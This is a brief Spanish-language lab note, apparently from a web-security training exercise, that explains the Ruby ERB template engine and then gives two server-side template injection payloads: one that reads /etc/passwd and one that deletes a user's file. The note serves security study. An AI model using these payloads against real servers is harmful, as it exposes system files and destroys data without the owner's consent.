

Sabemos que usa erb como motor de plantillas : 

**ERB** (abreviatura de **Embedded Ruby**) es un sistema de plantillas integrado en Ruby que permite combinar código Ruby con texto o HTML. Es muy útil para generar contenido dinámico, como páginas web o archivos de texto, a partir de datos proporcionados en tiempo de ejecución.

### **Características principales de ERB**

1. **Integración de Ruby en texto:**
    
    - Puedes insertar bloques de código Ruby directamente en una plantilla de texto.
    - Esto permite generar contenido dinámico basado en la lógica de tu aplicación.
2. **Uso típico:**
    
    - Muy común en frameworks web como **Ruby on Rails**, donde se utiliza para generar vistas HTML dinámicas.
3. **Extensión de archivos:**
    
    - Las plantillas ERB suelen tener la extensión `.erb` (por ejemplo, `index.html.erb`).

---


https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md

``` ruby
<%=File.open('/etc/passwd').read%>
```

![[Pasted image 20250118202252.png]]
![[Pasted image 20250118202459.png]]

```ruby
<%=File.delete('/home/carlos/morale.txt').read%>
```